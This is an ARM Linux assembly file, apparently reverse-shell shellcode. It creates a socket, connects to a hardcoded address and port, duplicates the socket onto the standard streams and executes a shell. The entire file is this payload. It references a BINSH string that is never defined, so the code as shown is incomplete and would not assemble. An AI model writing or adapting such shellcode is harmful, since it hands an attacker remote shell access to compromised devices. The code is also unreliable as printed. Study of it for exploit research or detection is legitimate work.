.section .text
.global _start

_start:
.code 32
	add r1,pc,#1
	bx r1
.code 16
	mov r0,#2
	mov r1,#1
	sub r2,r2,r2
	lsl r7,r1,#8
	add r7,r7,#25 /* socket */
	svc 1

	mov r6,r0
	adr r1,SOCKADDR
	mov r2,#16
	add r7,#2 /* connect */
	svc 1

	mov r7,#63 /* dup2 */
	mov r1,#2
Lb:
	mov r0,r6
	svc 1
	sub r1,#1
	bpl Lb

	adr r0,BINSH
	sub r2,r2,r2
	push {r0,r2}
	mov r1,sp
	mov r7,#11 /* execve */
	svc 1

.align 2
SOCKADDR:
.short 0x2
.short 0x3412
.byte 127,0,0,1
